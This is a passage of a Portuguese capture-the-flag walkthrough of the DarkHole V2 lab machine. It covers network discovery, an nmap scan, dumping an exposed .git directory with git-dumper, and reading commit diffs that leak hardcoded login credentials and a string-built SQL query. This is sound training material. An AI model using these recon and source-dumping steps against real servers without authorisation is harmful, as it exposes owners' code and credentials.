
Fase 1: Coleta de informação

Uso do netdiscover para identificação do IP a ser inspecionado no caso o 172.16.116.128

```jsx

root@kali:~# netdiscover -r 172.16.116.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                              
                                                                                                                                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.116.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                                             
 172.16.116.2    00:50:56:f9:18:06      1      60  VMware, Inc.                                                                                                                             
 172.16.116.128  00:0c:29:1a:79:bd      1      60  VMware, Inc.                                                                                                                             
 172.16.116.254  00:50:56:e4:11:09      1      60  VMware, Inc.                                                                                                                             


```

Uso do nmap para identificação das portas abertas e com a opção -A scripts de enumeração e com isso foi identificado a pasta .git


```jsx

──(root㉿kali)-[/home/kali]
└─# nmap -vvv -A 172.16.116.128   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 18:45 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:45
Completed NSE at 18:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:45
Completed NSE at 18:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:45
Completed NSE at 18:45, 0.00s elapsed
Initiating ARP Ping Scan at 18:45
Scanning 172.16.116.128 [1 port]
Completed ARP Ping Scan at 18:45, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:45
Completed Parallel DNS resolution of 1 host. at 18:45, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:45
Scanning 172.16.116.128 [1000 ports]
Discovered open port 22/tcp on 172.16.116.128
Discovered open port 80/tcp on 172.16.116.128
Completed SYN Stealth Scan at 18:45, 0.14s elapsed (1000 total ports)
Initiating Service scan at 18:45
Scanning 2 services on 172.16.116.128
Completed Service scan at 18:46, 6.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 172.16.116.128
NSE: Script scanning 172.16.116.128.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.36s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.00s elapsed
Nmap scan report for 172.16.116.128
Host is up, received arp-response (0.00095s latency).
Scanned at 2024-03-20 18:45:53 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8frfKJoug6k4wCSqcsbT7meZVMAFhil7gpcyzdiiutx5GhiKXsiuW3S4+t1F4VmqfUDXeLEGb9KPLyEI4Lsa/OB5sV/D9zsSSdiDwY7XrjM8C4rnWL+oHeVOIhwwKAPfs8GhxRUXmaGvWrMIqWqZPm7tuEm+PEcTTuAHyMypZelGByd7MCm5vAS5Yq0uNAzyNAmepvkmONeN1OrvmVMmHduMtPurHBeBj0n8A5JPKsMu7k9FuHRGS4t5r02gFjWq7sj69QXazooEDoOQKQ8MPmO2+lAFc/aASzVLmR18GR+f9iGa6QPayK6JrSGEsnmJ2P//3Ag2UxuN+KmbSHMv3GxMUx6UGzXmPUTB/EpjFjwnP8WJoDx1Kz6dJhSa989yRm/QpwDVNF2fXtWTdlerSwK91O4c3oeYfIWGSQYibFUz0zSnTlVyYeQXrKIgVTi/LXL4CLx2RxBELLnpZpzb6bi2E1SbgN/O8Z0s9wGutN1lHlNXeAr/DtFHtbydH3mM=
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzep/j+gpuyw1FGbB2Xv/n9dxfX6dVxL1fq5kPo73VI7meVIOtHMfKJRR171UkOgjQcmdEDbacx/1gPYROEpOQ=
|   256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJSt7LQLdRjZXyGAxifV2JJ37dTptXNSJNmSYLMi6ct5
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   172.16.116.128:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DarkHole V2
MAC Address: 00:0C:29:1A:79:BD (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/20%OT=22%CT=1%CU=33014%PV=Y%DS=1%DC=D%G=Y%M=000C2
OS:9%TM=65FB6729%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%I
OS:I=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW
OS:7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88
OS:%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=40%CD=S)

Uptime guess: 17.806 days (since Sat Mar  2 22:25:27 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.95 ms 172.16.116.128

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:46
Completed NSE at 18:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)

```
Fazendo o download do projeto git-dumper

```jsx
──(root㉿kali)-[/home/kali]
└─# git clone https://github.com/arthaud/git-dumper.git
Cloning into 'git-dumper'...
remote: Enumerating objects: 197, done.
remote: Counting objects: 100% (130/130), done.
remote: Compressing objects: 100% (70/70), done.
remote: Total 197 (delta 83), reused 74 (delta 60), pack-reused 67
Receiving objects: 100% (197/197), 59.29 KiB | 2.96 MiB/s, done.
Resolving deltas: 100% (104/104), done.
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# cd git-dumper 
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/git-dumper]
└─# mkdir backup
```      
Fazendo o downaload do conteúdo da pasta .git
                                  
```jsx
                                                                                                                                                     
┌──(root㉿kali)-[/home/kali/git-dumper]
└─# python3 git_dumper.py http://172.16.116.128/.git/ backup
[-] Testing http://172.16.116.128/.git/HEAD [200]
[-] Testing http://172.16.116.128/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://172.16.116.128/.git/ [200]
[-] Fetching http://172.16.116.128/.gitignore [404]
[-] http://172.16.116.128/.gitignore responded with status code 404
[-] Fetching http://172.16.116.128/.git/HEAD [200]
[-] Fetching http://172.16.116.128/.git/COMMIT_EDITMSG [200]
[-] Fetching http://172.16.116.128/.git/config [200]
[-] Fetching http://172.16.116.128/.git/description [200]
[-] Fetching http://172.16.116.128/.git/refs/ [200]
[-] Fetching http://172.16.116.128/.git/info/ [200]
[-] Fetching http://172.16.116.128/.git/logs/ [200]
[-] Fetching http://172.16.116.128/.git/hooks/ [200]
[-] Fetching http://172.16.116.128/.git/objects/ [200]
[-] Fetching http://172.16.116.128/.git/logs/refs/ [200]
[-] Fetching http://172.16.116.128/.git/logs/HEAD [200]
[-] Fetching http://172.16.116.128/.git/refs/heads/ [200]
[-] Fetching http://172.16.116.128/.git/logs/refs/heads/ [200]
[-] Fetching http://172.16.116.128/.git/refs/tags/ [200]
[-] Fetching http://172.16.116.128/.git/objects/0f/ [200]
[-] Fetching http://172.16.116.128/.git/objects/04/ [200]
[-] Fetching http://172.16.116.128/.git/logs/refs/heads/master [200]
[-] Fetching http://172.16.116.128/.git/objects/09/ [200]
[-] Fetching http://172.16.116.128/.git/objects/8b/ [200]
[-] Fetching http://172.16.116.128/.git/objects/8a/ [200]
[-] Fetching http://172.16.116.128/.git/objects/32/ [200]
[-] Fetching http://172.16.116.128/.git/objects/49/ [200]
[-] Fetching http://172.16.116.128/.git/objects/56/ [200]
[-] Fetching http://172.16.116.128/.git/objects/4e/ [200]
[-] Fetching http://172.16.116.128/.git/objects/9d/ [200]
[-] Fetching http://172.16.116.128/.git/objects/7f/ [200]
[-] Fetching http://172.16.116.128/.git/objects/66/ [200]
[-] Fetching http://172.16.116.128/.git/objects/6e/ [200]
[-] Fetching http://172.16.116.128/.git/objects/59/ [200]
[-] Fetching http://172.16.116.128/.git/objects/77/ [200]
[-] Fetching http://172.16.116.128/.git/objects/a2/ [200]
[-] Fetching http://172.16.116.128/.git/objects/b6/ [200]
[-] Fetching http://172.16.116.128/.git/objects/c1/ [200]
[-] Fetching http://172.16.116.128/.git/objects/a4/ [200]
[-] Fetching http://172.16.116.128/.git/objects/c9/ [200]
[-] Fetching http://172.16.116.128/.git/objects/b2/ [200]
[-] Fetching http://172.16.116.128/.git/objects/ca/ [200]
[-] Fetching http://172.16.116.128/.git/objects/93/ [200]
[-] Fetching http://172.16.116.128/.git/objects/aa/ [200]
[-] Fetching http://172.16.116.128/.git/objects/e6/ [200]
[-] Fetching http://172.16.116.128/.git/objects/info/ [200]
[-] Fetching http://172.16.116.128/.git/refs/heads/master [200]
[-] Fetching http://172.16.116.128/.git/objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e [200]
[-] Fetching http://172.16.116.128/.git/info/exclude [200]
[-] Fetching http://172.16.116.128/.git/objects/09/04b1923584a0fb0ab31632de47c520db6a6e21 [200]
[-] Fetching http://172.16.116.128/.git/hooks/commit-msg.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/post-update.sample [200]
[-] Fetching http://172.16.116.128/.git/objects/pack/ [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-commit.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-push.sample [200]
[-] Fetching http://172.16.116.128/.git/objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4 [200]
[-] Fetching http://172.16.116.128/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://172.16.116.128/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://172.16.116.128/.git/objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d [200]
[-] Fetching http://172.16.116.128/.git/hooks/update.sample [200]
[-] Fetching http://172.16.116.128/.git/objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67 [200]
[-] Fetching http://172.16.116.128/.git/objects/49/151b46cc957717f5529d362115339d4abfe207 [200]
[-] Fetching http://172.16.116.128/.git/hooks/pre-receive.sample [200]
[-] Fetching http://172.16.116.128/.git/objects/7f/d95a2f170cb55fbb335a56974689f659e2c383 [200]
[-] Fetching http://172.16.116.128/.git/objects/56/987e1f75e392aae416571b38b53922c49f6e7e [200]
[-] Fetching http://172.16.116.128/.git/objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf [200]
[-] Fetching http://172.16.116.128/.git/objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e [200]
[-] Fetching http://172.16.116.128/.git/objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d [200]
[-] Fetching http://172.16.116.128/.git/objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133 [200]
[-] Fetching http://172.16.116.128/.git/objects/59/218997bfb0d8012a918e43bea3e497e68248a9 [200]
[-] Fetching http://172.16.116.128/.git/objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3 [200]
[-] Fetching http://172.16.116.128/.git/objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d [200]
[-] Fetching http://172.16.116.128/.git/objects/32/d0928f948af8252b0200ff9cac40534bfe230b [200]
[-] Fetching http://172.16.116.128/.git/objects/a2/0488521df2b427246c0155570f5bfad6936c6c [200]
[-] Fetching http://172.16.116.128/.git/objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76 [200]
[-] Fetching http://172.16.116.128/.git/objects/b2/076545503531a2e482a89b84f387e5d44d35c0 [200]
[-] Fetching http://172.16.116.128/.git/objects/b6/f546da0ab9a91467412383909c8edc9859a363 [200]
[-] Fetching http://172.16.116.128/.git/objects/ca/f37015411ad104985c7dd86373b3a347f71097 [200]
[-] Fetching http://172.16.116.128/.git/objects/c1/ef127486aa47cd0b3435bca246594a43b559bb [200]
[-] Fetching http://172.16.116.128/.git/objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa [200]
[-] Fetching http://172.16.116.128/.git/objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917 [200]
[-] Fetching http://172.16.116.128/.git/objects/a4/d900a8d85e8938d3601f3cef113ee293028e10 [200]
[-] Fetching http://172.16.116.128/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://172.16.116.128/.git/index [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 14 paths from the index
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/git-dumper]
└─# cd backup    
```

Consultando os logs do git:


```jsx
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/git-dumper]
└─# cd backup    
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/git-dumper/backup]
└─# git log                                             
commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300

    i changed login.php file for more secure

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:02:44 2021 +0300

    First Initialize
                                              

```

Log expondo as credencias de acesso do portal interno:


```jsx
┌──(root㉿kali)-[/home/kali/git-dumper/backup]
└─# git show 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4
commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300

    i changed login.php file for more secure

diff --git a/login.php b/login.php
index 8a0ff67..0904b19 100644
--- a/login.php
+++ b/login.php
@@ -2,7 +2,10 @@
 session_start();
 require 'config/config.php';
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
+    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
+    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
+    if($check->num_rows){
         $_SESSION['userid'] = 1;
         header("location:dashboard.php");
         die();
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/git-dumper/backup]
└─# git show a4d900a8d85e8938d3601f3cef113ee293028e10 
commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

diff --git a/login.php b/login.php
index e69de29..8a0ff67 100644
--- a/login.php
+++ b/login.php
@@ -0,0 +1,42 @@
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
+    }
+
+}
+?>
+
+<link rel="stylesheet" href="style/login.css">
+<head>
+    <script src="https://kit.fontawesome.com/fe909495a1.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="Project_1.css">
+    <title>Home</title>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>👋 Welcome</h1>
+    <!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html"><h1>Sign In</h1></a> -->
+    <!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html">  <h1>Log In</h1></a> -->
```
